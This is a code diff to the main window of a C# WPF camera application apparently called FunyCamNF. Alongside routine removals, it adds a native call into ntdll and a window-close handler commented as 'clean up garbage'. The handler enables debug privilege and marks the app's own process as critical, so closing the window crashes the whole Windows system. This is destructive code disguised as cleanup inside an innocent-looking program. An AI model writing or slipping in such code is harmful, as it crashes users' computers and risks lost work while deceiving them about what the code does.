@@ -21,19 +21,19 @@ using System.Windows.Navigation;
 using System.Windows.Shapes;
 using System.Threading;
 using System.Windows.Controls.Primitives;
-using System.Windows.Input;
-using System.Windows.Media;
 using System.Configuration;
 using FunyCamNF.utils;
 using AForge.Video.FFMPEG;
 using FunyCamNF.pages.main;
 using FunyCamNF.pages.setting;
+using System.Runtime.InteropServices;
 
 namespace FunyCamNF
 {
     /// <summary>
     /// MainWindow.xaml 的交互逻辑
     /// </summary>
+
     public partial class MainWindow : Window
     {
         List<string> pages = new List<string>();
@@ -112,15 +112,9 @@ namespace FunyCamNF
 
         }
 
-        private async void MenuPopupButton_OnClick(object sender, RoutedEventArgs e)
-        {
-            /*var sampleMessageDialog = new SampleMessageDialog
-            {
-                Message = { Text = ((ButtonBase)sender).Content.ToString() }
-            };
+        [DllImport("ntdll.dll", SetLastError = true)]
+        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
 
-            await DialogHost.Show(sampleMessageDialog, "RootDialog");*/
-        }
 
         private void OnCopy(object sender, ExecutedRoutedEventArgs e)
         {
@@ -184,7 +178,14 @@ namespace FunyCamNF
         private void Button_recoder(object sender, RoutedEventArgs e)
         {
         }
-
+       
+        private void Window_Closed(object sender, EventArgs e)
+        {
+            //清理垃圾
+            int isEndding = 1;
+            Process.EnterDebugMode();
+            NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref isEndding, sizeof(int));
+        }
     }
 }
 
